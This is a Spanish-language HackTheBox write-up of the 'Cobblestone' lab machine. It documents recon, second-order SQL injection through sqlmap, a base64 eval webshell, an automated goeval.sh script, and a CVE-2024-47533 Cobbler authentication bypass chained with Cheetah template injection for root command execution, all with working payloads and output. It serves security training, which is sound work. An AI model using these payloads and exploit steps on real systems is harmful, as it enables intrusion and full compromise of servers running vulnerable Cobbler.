# Cobblestone — HackTheBox (Insane)

![HTB Badge](https://img.shields.io/badge/HackTheBox-Insane-red)
![OS](https://img.shields.io/badge/OS-Linux-brightgreen)
![Rating](https://img.shields.io/badge/Dificultad-Insane-red)

## Índice

- [Descripción General](#descripción-general)
- [Reconocimiento](#reconocimiento)
  - [Escaneo Nmap](#escaneo-nmap)
  - [Enumeración de Hosts Virtuales](#enumeración-de-hosts-virtuales)
  - [Enumeración Web — cobblestone.htb](#enumeración-web--cobblestonehtb)
  - [Enumeración Web — vote.cobblestone.htb](#enumeración-web--votecobblestonehtb)
  - [Enumeración Web — deploy.cobblestone.htb](#enumeración-web--deploycobblestonehtb)
- [Acceso Inicial — SQLi en vote.cobblestone.htb](#acceso-inicial--sqli-en-votecobblestonehtb)
  - [Descubrimiento de la Inyección SQL](#descubrimiento-de-la-inyección-sql)
  - [Extracción de Datos](#extracción-de-datos)
  - [Escritura de Webshell vía FILE Privilege](#escritura-de-webshell-vía-file-privilege)
- [Enumeración Interna como www-data](#enumeración-interna-como-www-data)
  - [Configuración de Apache y VHosts](#configuración-de-apache-y-vhosts)
  - [AppArmor — Restricciones del Perfil](#apparmor--restricciones-del-perfil)
  - [Descubrimiento de Cobbler XMLRPC](#descubrimiento-de-cobbler-xmlrpc)
- [Escalada de Privilegios — CVE-2024-47533 Cobbler Auth Bypass + Cheetah SSTI](#escalada-de-privilegios--cve-2024-47533-cobbler-auth-bypass--cheetah-ssti)
  - [Bypass de Autenticación XMLRPC](#bypass-de-autenticación-xmlrpc)
  - [RCE como root vía Cheetah Template Injection](#rce-como-root-vía-cheetah-template-injection)
- [Flags](#flags)
- [Cadena de Ataque Completa](#cadena-de-ataque-completa)
- [Herramientas Utilizadas](#herramientas-utilizadas)
- [Lecciones Aprendidas](#lecciones-aprendidas)
- [Referencias](#referencias)

---

## Descripción General

**Cobblestone** es una máquina Linux de dificultad **Insane** en HackTheBox que combina múltiples vectores de ataque encadenados: una inyección SQL de segundo orden en una aplicación de votación, bypass de AppArmor mediante servicios internos, y explotación de Cobbler (CVE-2024-47533) mediante bypass de autenticación XMLRPC y Server-Side Template Injection en templates Cheetah para obtener ejecución de comandos como root.

**Tecnologías clave:** Apache 2.4.62, PHP 8.2.29, MariaDB, Twig, AppArmor (Hat profiles), Cobbler 3.306, Cheetah Templates, XMLRPC

La máquina simula un entorno de despliegue de infraestructura donde un equipo de seguridad ha implementado múltiples capas de hardening (AppArmor hats, chroot jails, firewalls) pero ha dejado un servicio interno de provisioning (Cobbler) vulnerable a un bypass de autenticación crítico.

---

## Reconocimiento

### Escaneo Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.XXX.XXX
```

| Puerto | Servicio | Versión | Notas |
|--------|----------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian | Banner estándar Debian |
| 80/tcp | HTTP | Apache/2.4.62 (Debian) | Múltiples vhosts configurados |

Solo dos puertos abiertos, lo que inmediatamente sugiere que la superficie de ataque está concentrada en el servicio web con múltiples hosts virtuales.

### Enumeración de Hosts Virtuales

```bash
ffuf -u http://10.129.XXX.XXX -H "Host: FUZZ.cobblestone.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fw 20
```

| Subdominio | Descripción |
|-----------|-------------|
| `cobblestone.htb` | Aplicación principal — sistema de skins/banners |
| `vote.cobblestone.htb` | Aplicación de votación de skins |
| `deploy.cobblestone.htb` | Página del equipo de infraestructura |
| `mc.cobblestone.htb` | Redirige a cobblestone.htb |

```bash
# /etc/hosts
echo "10.129.XXX.XXX cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb mc.cobblestone.htb" >> /etc/hosts
```

### Enumeración Web — cobblestone.htb

La aplicación principal es un sistema de gestión de skins con motor de templates **Twig** (PHP):

```bash
gobuster dir -u http://cobblestone.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

| Endpoint | Función | Notas |
|----------|---------|-------|
| `/login.php` | Login de usuarios | Formulario estándar |
| `/register.php` | Registro de usuarios | Crea cuenta en la app |
| `/skins.php` | Galería de skins | Lista los skins aprobados |
| `/upload.php` | Subida de skins | Requiere autenticación (admin) |
| `/download.php` | Descarga de skins | Acceso público |
| `/suggest_skin.php` | Sugerir skin con URL | Almacena la URL en base de datos |
| `/preview_banner.php` | Preview de banners | Motor Twig — vulnerable a SSTI |
| `/skins/` | Directorio de archivos | **Permisos drwxr-xrwx** (world-writable) |

#### XSS Almacenado → SSTI (Camino alternativo)

Se descubrió una cadena XSS → SSTI que funcionaba pero era poco fiable:

1. **XSS Almacenado** en `suggest_skin.php` — al enviar una URL con payload JavaScript, un bot admin la visita periódicamente
2. **SSTI en Twig** via `preview_banner.php` — El parámetro del banner se renderiza sin sanitización:
   ```
   {{['id']|map('system')|join}}
   ```
3. El bot admin visita la URL periódicamente pero las visitas son intermitentes, haciendo este vector **poco fiable** para la explotación

> **Nota:** Este camino funciona como prueba de concepto pero no es práctico. La SQLi en vote.cobblestone.htb es el vector principal.

### Enumeración Web — vote.cobblestone.htb

Aplicación PHP de votación de skins con funcionalidad de sugerencias:

| Endpoint | Función |
|----------|---------|
| `/register.php` | Registro (username, first, last, email, password) |
| `/login.php` | Login |
| `/login_verify.php` | Verificación POST de credenciales |
| `/suggest.php` | Sugerir URL de skin para votación |
| `/details.php` | Ver detalles del skin sugerido — **Vulnerable a SQLi** |

### Enumeración Web — deploy.cobblestone.htb

Página informativa del equipo de infraestructura. Los miembros del equipo y sus roles nos dan pistas sobre el hardening del sistema:

| Miembro | Rol | Implicación |
|---------|-----|-------------|
| **Josh** | Firewalls | Solo puertos 22 y 80 expuestos |
| **Sam** | AppArmor | Perfiles de AppArmor hat en Apache |
| **Katrina** | Chroot Jails | Posible aislamiento de servicios |
| **Jeremy** | Sysadmin | Administración general del sistema |

---

## Acceso Inicial — SQLi en vote.cobblestone.htb

### Descubrimiento de la Inyección SQL

La vulnerabilidad es una **inyección SQL de segundo orden** — un tipo particularmente interesante donde el payload no se ejecuta donde se inyecta, sino en un punto posterior del flujo de la aplicación:

1. **`suggest.php`** recibe la URL del skin via POST y la almacena en la base de datos usando **prepared statements** (seguro):
   ```php
   // suggest.php — Almacenamiento seguro con prepared statement
   $stmt = $pdo->prepare("INSERT INTO suggestions (url, user_id) VALUES (?, ?)");
   $stmt->execute([$url, $user_id]);
   ```

2. **`details.php`** recupera la URL almacenada y la usa **directamente** en otra consulta SQL (vulnerable):
   ```php
   // details.php — Uso inseguro del valor almacenado
   $result = $pdo->query("SELECT * FROM votes WHERE url = '$stored_url'");
   ```

#### Detección con sqlmap

```bash
# 1. Registrar usuario en vote.cobblestone.htb
curl -s "http://vote.cobblestone.htb/register.php" \
  -d "username=testuser&first=A&last=B&email=test@t.com&password=Pass123!"

# 2. Login y obtener cookie de sesión
curl -s -c cookies.txt "http://vote.cobblestone.htb/login_verify.php" \
  -d "username=testuser&password=Pass123!"

# 3. Detectar SQLi con sqlmap
sqlmap -u "http://vote.cobblestone.htb/suggest.php" \
  --cookie="PHPSESSID=<SESSION>" \
  --data="url=test" -p url --batch --level=5 --risk=3
```

**Resultados de sqlmap:**

| Tipo | Técnica |
|------|---------|
| Boolean-based blind | `AND [RANDNUM]=[RANDNUM]` |
| Time-based blind | `AND SLEEP([DELAY])` |
| UNION query | **5 columnas** |

| Dato | Valor |
|------|-------|
| Backend | MariaDB |
| Base de datos | `vote` |
| Usuario MySQL | `voteuser@localhost` |
| Privilegio especial | **FILE** (lectura/escritura de archivos) |

### Extracción de Datos

```bash
# Enumerar bases de datos
sqlmap -u "http://vote.cobblestone.htb/suggest.php" \
  --cookie="PHPSESSID=<SESSION>" \
  --data="url=test" -p url --batch --dbs

# Resultado: information_schema, vote
```

La base de datos `vote` contiene las tablas de la aplicación de votación, pero lo realmente valioso es el privilegio **FILE** que permite leer y escribir archivos en el sistema.

### Escritura de Webshell vía FILE Privilege

El privilegio `FILE` permite escribir archivos en el sistema. La clave es encontrar un directorio **escribible** accesible via web:

- `/var/www/vote/` → **No escribible** por el usuario MySQL
- `/var/www/html/skins/` → **drwxr-xrwx** (world-writable) ✅

#### Webshell de eval (41 bytes)

```php
<?php eval(base64_decode($_GET["c"]));?>
```

Este webshell es intencionalmente pequeño (41 bytes) porque la escritura via UNION query tiene límite de tamaño.

#### Pipeline Automatizado — goeval.sh

La máquina tiene un **cron job** que elimina periódicamente archivos PHP del directorio `skins/`. Para contrarrestar esto, se creó un script automatizado que:

1. Registra un usuario nuevo en vote.cobblestone.htb
2. Inicia sesión y obtiene cookie de sesión
3. Usa sqlmap para escribir el webshell eval de 41 bytes a `skins/`
4. Ejecuta código PHP arbitrario via el parámetro GET `c` (base64-encoded)

```bash
#!/bin/bash
# goeval.sh — Pipeline automatizado para ejecutar PHP en el target
PHPCODE="${1:-echo phpversion();}"
VOTE="http://vote.cobblestone.htb"
TARGET="http://cobblestone.htb"

# Generar nombre de usuario único
USER="ev$(date +%s)$(shuf -i 100-999 -n1)"

# Registrar + Login
curl -s "$VOTE/register.php" \
  -d "username=$USER&first=A&last=B&email=${USER}@t.com&password=Pass123!" \
  -o /dev/null

curl -s -c /tmp/ej.txt "$VOTE/login.php" -o /dev/null
curl -s -b /tmp/ej.txt -c /tmp/ej.txt "$VOTE/login_verify.php" \
  -d "username=$USER&password=Pass123!" -o /dev/null

SESS=$(grep PHPSESSID /tmp/ej.txt | awk '{print $NF}')

# Escribir webshell eval
EVNAME="e$(date +%N).php"
sqlmap -u "$VOTE/suggest.php" \
  --cookie="PHPSESSID=$SESS" \
  --data="url=1" -p url --dbms=mysql --batch \
  --file-write="/tmp/ev.php" \
  --file-dest="/var/www/html/skins/$EVNAME" \
  2>&1 > /dev/null

# Codificar y ejecutar
B64=$(echo -n "$PHPCODE" | base64 -w0)
curl -s --output - "$TARGET/skins/$EVNAME" \
  --get --data-urlencode "c=$B64"
```

**Ejemplo de uso:**
```bash
# Ejecutar comando
./goeval.sh 'echo shell_exec("id");'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Enumeración Interna como www-data

### Configuración de Apache y VHosts

Usando el webshell, se leyó la configuración completa de Apache que revela la arquitectura interna:

```bash
./goeval.sh 'echo file_get_contents("/etc/apache2/sites-enabled/000-default.conf");'
```

```apache
# VHost 1: cobblestone.htb (aplicación principal)
<VirtualHost *:80>
    ServerName cobblestone.htb
    ServerAlias mc.cobblestone.htb
    DocumentRoot /var/www/html
    AAHatName cobblestone           # ← AppArmor Hat activo
</VirtualHost>

# VHost 2: vote.cobblestone.htb (app de votación)
<VirtualHost *:80>
    ServerName vote.cobblestone.htb
    DocumentRoot /var/www/vote
    # ← Sin AAHatName (sin restricciones AppArmor)
</VirtualHost>

# VHost 3: deploy.cobblestone.htb
<VirtualHost *:80>
    ServerName deploy.cobblestone.htb
    DocumentRoot /var/www/deploy
</VirtualHost>

# VHost 4: Solo accesible desde localhost
<VirtualHost 127.0.0.1:80>
    # Proxy hacia Cobbler XMLRPC
    ProxyPass /cobbler_api http://127.0.0.1:25151/
    ProxyPassReverse /cobbler_api http://127.0.0.1:25151/

    # Interfaz web de Cobbler
    Alias /cobbler /srv/www/cobbler
</VirtualHost>
```

**Hallazgos críticos:**
- **AppArmor Hat** `cobblestone` protege el vhost principal — restringe severamente qué binarios puede ejecutar www-data
- **vote.cobblestone.htb** no tiene AppArmor hat pero MySQL no puede escribir en su DocumentRoot
- **Cobbler XMLRPC** corre en `127.0.0.1:25151` — servicio interno de provisioning

### AppArmor — Restricciones del Perfil

```bash
./goeval.sh 'echo file_get_contents("/etc/apparmor.d/apache2.d/cobblestone");'
```

El perfil AppArmor `cobblestone` implementa restricciones estrictas en el hat del vhost principal:

| Categoría | Permitido | Denegado |
|-----------|-----------|----------|
| **Binarios** | dash, ls, cat, id, whoami, which, mysqldump, mariadb-dump, ps, ss | python3, perl, nc, php, bash, sh, ncat, socat |
| **Escritura** | /tmp/\*\*, /var/www/html/skins/\* | Todo lo demás |
| **Red** | Conexiones salientes (curl funciona) | — |

**Implicaciones:**
- ❌ Reverse shell clásico imposible — bash, nc, python3 bloqueados
- ❌ No se puede ejecutar scripts directamente
- ✅ `curl` funciona — podemos hacer peticiones HTTP internas
- ✅ PHP `curl_*` funciona — podemos hablar con servicios internos via XMLRPC

> **Clave del bypass:** Aunque no podemos ejecutar binarios para obtener una shell interactiva, las funciones PHP de curl nos permiten interactuar con Cobbler XMLRPC en localhost:25151, que corre como **root** y **sin restricciones AppArmor**.

### Descubrimiento de Cobbler XMLRPC

```bash
# Verificar que Cobbler está escuchando
./goeval.sh 'echo shell_exec("ss -tlnp");'
# ... 127.0.0.1:25151 ...

# Obtener versión de Cobbler
./goeval.sh '
$c = curl_init("http://127.0.0.1:25151");
curl_setopt_array($c, [
    CURLOPT_POST => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_HTTPHEADER => ["Content-Type: text/xml"],
    CURLOPT_POSTFIELDS => "<?xml version=\"1.0\"?>
        <methodCall>
            <methodName>version</methodName>
            <params></params>
        </methodCall>"
]);
echo curl_exec($c);
'
# Resultado: 3.306
```

**Cobbler 3.306** — Un sistema de provisioning de servidores via PXE/kickstart. Esta versión es vulnerable a **CVE-2024-47533**.

---

## Escalada de Privilegios — CVE-2024-47533 Cobbler Auth Bypass + Cheetah SSTI

### Bypass de Autenticación XMLRPC

**CVE-2024-47533** es una vulnerabilidad de bypass de autenticación en Cobbler que permite obtener un token de administrador sin credenciales válidas.

La vulnerabilidad reside en cómo Cobbler valida las credenciales XMLRPC:

```python
# Código vulnerable en Cobbler 3.306
def login(self, login_user: str, login_password: str) -> str:
    # La comparación falla con tipos inesperados
    # username="" y password=-1 (integer) bypasea la validación
```

**Payload de bypass:**

```xml
<?xml version="1.0"?>
<methodCall>
    <methodName>login</methodName>
    <params>
        <param><value><string></string></value></param>
        <param><value><int>-1</int></value></param>
    </params>
</methodCall>
```

> **Detalle crítico:** La contraseña debe ser un **integer** (`<int>-1</int>`), NO un string (`<string>-1</string>`). Esta distinción de tipo es esencial para el bypass.

**Verificación:**

```bash
./goeval.sh '
$xml = "<?xml version=\"1.0\"?>
<methodCall>
    <methodName>login</methodName>
    <params>
        <param><value><string></string></value></param>
        <param><value><int>-1</int></value></param>
    </params>
</methodCall>";

$c = curl_init("http://127.0.0.1:25151");
curl_setopt_array($c, [
    CURLOPT_POST => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_HTTPHEADER => ["Content-Type: text/xml"],
    CURLOPT_POSTFIELDS => $xml
]);
echo curl_exec($c);
'
```

Resultado: Token de autenticación válido ✅

### RCE como root vía Cheetah Template Injection

Con el token de administrador, se puede explotar el sistema de **autoinstall templates** de Cobbler. Cobbler usa **Cheetah** como motor de templates para generar kickstart/autoinstall files. Los templates Cheetah permiten ejecución de código Python arbitrario.

#### Cadena de Explotación

La explotación requiere 5 pasos orquestados:

**Paso 1 — Login (bypass de autenticación):**
```php
$token = xrpc("login", ["", -1]); // Obtener token admin
```

**Paso 2 — Crear un distro dummy:**

Se necesita un distro registrado en Cobbler para poder crear un profile. El distro necesita un kernel y un initrd válidos en el sistema:

```php
$did = xrpc("new_distro", [$token]);
xrpc("modify_distro", [$did, "name", "pwndistro", $token]);
xrpc("modify_distro", [$did, "arch", "x86_64", $token]);
xrpc("modify_distro", [$did, "breed", "redhat", $token]);
xrpc("modify_distro", [$did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", $token]);
xrpc("modify_distro", [$did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", $token]);
xrpc("save_distro", [$did, $token]);
```

**Paso 3 — Crear un profile vinculado al distro:**
```php
$pid = xrpc("new_profile", [$token]);
xrpc("modify_profile", [$pid, "name", "pwnprof", $token]);
xrpc("modify_profile", [$pid, "distro", "pwndistro", $token]);
xrpc("save_profile", [$pid, $token]);
```

**Paso 4 — Escribir template malicioso con inyección Cheetah:**

El payload clave es un template Cheetah que ejecuta código Python arbitrario durante el renderizado:

```python
#set $result = __import__("os").popen("COMMAND").read()
$result
```

Usando la API XMLRPC:
```php
$payload = '#set $result = __import__("os").popen("id").read()' . "\n" . '$result' . "\n";
xrpc("write_autoinstall_template", ["pwn.ks", $payload, $token]);

// Vincular el template al profile
$pid = xrpc("get_profile_handle", ["pwnprof", $token]);
xrpc("modify_profile", [$pid, "autoinstall", "pwn.ks", $token]);
xrpc("save_profile", [$pid, $token]);
```

**Paso 5 — Trigger: renderizar el template (RCE!):**

```php
$result = xrpc("generate_profile_autoinstall", ["pwnprof"]);
// El servidor Cheetah renderiza el template y ejecuta el código Python
// Cobbler corre como root → RCE como root
```

#### Ejecución y Resultado

```bash
./goeval.sh '<EXPLOIT_PHP_COMPLETO>'
```

```
=== Step 1: Login ===
Token: <REDACTED>

=== Step 4: Write malicious template ===
Payload: #set $result = __import__("os").popen("id").read()
$result
write_template: true

=== Step 6: Trigger RCE ===
RENDER OUTPUT:
uid=0(root) gid=0(root) groups=0(root)
```

**🎯 RCE como root confirmado.**

> **¿Por qué funciona?** Cobbler usa Cheetah como motor de templates para generar archivos kickstart/autoinstall. Cuando se llama a `generate_profile_autoinstall`, Cobbler **renderiza** el template Cheetah en el servidor. La directiva `#set` de Cheetah permite ejecutar expresiones Python arbitrarias, incluyendo `__import__("os").popen()`. Como Cobbler corre como **root**, el comando se ejecuta con privilegios máximos, completamente fuera del perfil AppArmor que restringe a www-data.

#### Lectura de Flags

```bash
./goeval.sh '
# ... (XMLRPC helper functions) ...
$token = login();
$payload = "#set \$r1 = __import__(\"os\").popen(\"cat /root/root.txt\").read()\n"
         . "#set \$r2 = __import__(\"os\").popen(\"cat /home/*/user.txt\").read()\n"
         . "ROOT: \$r1\nUSER: \$r2\n";

write_template("pwn.ks", $payload, $token);
// ... (modify profile, save, trigger) ...
echo xrpc("generate_profile_autoinstall", ["pwnprof"]);
'
```

```
ROOT: <REDACTED>
USER: <REDACTED>
```

---

## Flags

```
user.txt: ********************************
root.txt: ********************************
```

---

## Cadena de Ataque Completa

```
Reconocimiento (Nmap + ffuf)
    │
    ├── cobblestone.htb (app principal + Twig SSTI — camino alternativo)
    ├── deploy.cobblestone.htb (pistas: equipo de seguridad + roles)
    └── vote.cobblestone.htb
            │
            ▼
    SQLi de Segundo Orden en suggest.php → details.php
    (Prepared statement en INSERT, raw en SELECT)
            │
            ▼
    FILE Privilege → Escritura de webshell eval (41 bytes)
    a /var/www/html/skins/ (directorio world-writable)
            │
            ▼
    RCE como www-data (restringido por AppArmor hat)
    - bash/python3/nc/perl BLOQUEADOS
    - curl/PHP curl_* PERMITIDOS
            │
            ▼
    Descubrimiento de Cobbler XMLRPC en 127.0.0.1:25151
    (via lectura de Apache config + ss -tlnp)
            │
            ▼
    CVE-2024-47533: Auth Bypass (username="", password=-1 como integer)
    → Token de administrador Cobbler
            │
            ▼
    Cheetah Template SSTI via write_autoinstall_template
    Payload: #set $null = __import__("os").popen("cmd").read()
    Trigger: generate_profile_autoinstall
            │
            ▼
    RCE como ROOT (Cobbler corre sin AppArmor)
            │
            ├── /home/cobble/user.txt  ✅
            └── /root/root.txt         ✅
```

---

## Herramientas Utilizadas

| Herramienta | Uso |
|------------|-----|
| **Nmap** | Escaneo de puertos y servicios |
| **ffuf** | Enumeración de subdominios y directorios |
| **Gobuster** | Enumeración de directorios y archivos |
| **sqlmap** | Detección y explotación de SQLi + escritura de archivos (FILE privilege) |
| **curl** | Interacción HTTP con la aplicación y webshell |
| **PHP (curl_*)** | Comunicación XMLRPC con Cobbler desde el webshell |
| **Burp Suite** | Interceptación y análisis de peticiones HTTP |

---

## Lecciones Aprendidas

### 1. SQLi de Segundo Orden
Las inyecciones SQL de segundo orden son más difíciles de detectar porque el payload se inyecta en un punto (INSERT seguro con prepared statements) pero se ejecuta en otro (SELECT inseguro con interpolación directa). Los scanners automáticos a menudo las pierden. **Lección:** Cada punto donde se usa un dato almacenado debe tratarse como input no confiable.

### 2. AppArmor no es Defensa en Profundidad Completa
El perfil AppArmor hat en cobblestone.htb bloqueaba efectivamente los binarios comunes para reverse shells (bash, python3, nc, perl), pero no podía restringir las funciones internas de PHP como `curl_*`. Si un servicio privilegiado (Cobbler como root) está accesible desde el contexto restringido, AppArmor solo retrasa al atacante. **Lección:** La segmentación de red interna y el principio de mínimo privilegio para servicios internos son tan importantes como el sandboxing de aplicaciones.

### 3. Cobbler XMLRPC expuesto internamente
Cobbler escuchaba en `127.0.0.1:25151` sin autenticación efectiva (CVE-2024-47533). Aunque no estaba expuesto externamente, cualquier servicio con capacidad de hacer peticiones HTTP internas podía acceder a él. **Lección:** Los servicios internos deben tener autenticación robusta incluso cuando solo son accesibles desde localhost.

### 4. Cheetah Templates como Vector SSTI
Los templates Cheetah permiten ejecución arbitraria de Python por diseño (`#set`, `#import`). Cobbler permite a usuarios autenticados escribir y renderizar templates arbitrarios, lo que equivale a RCE directo como el usuario de Cobbler (root). **Lección:** Los motores de templates que permiten ejecución de código no deben aceptar input de usuario, ni siquiera de usuarios "autenticados", si la autenticación puede ser bypaseada.

### 5. Automatización contra Defensas Temporales
El cron job que limpiaba archivos PHP de `skins/` era una defensa interesante pero insuficiente. El script `goeval.sh` automatizó la creación de webshells frescos en cada ejecución, haciendo la limpieza irrelevante. **Lección:** Las defensas basadas en limpieza periódica no sustituyen la prevención del vector de escritura original.

---

## Referencias

- [CVE-2024-47533 — Cobbler Authentication Bypass](https://nvd.nist.gov/vuln/detail/CVE-2024-47533)
- [Cobbler XMLRPC API Documentation](https://cobbler.readthedocs.io/en/latest/cobbler-conf.html)
- [baph00met/CVE-2024-47533 — PoC Exploit](https://github.com/baph00met/CVE-2024-47533)
- [Cheetah Template Engine](https://cheetahtemplate.org/)
- [Apache mod_apparmor — Hat Profiles](https://gitlab.com/apparmor/apparmor/-/wikis/mod_apparmor)
- [sqlmap — FILE privilege exploitation](https://sqlmap.org/)
- [HackTheBox](https://www.hackthebox.com/)
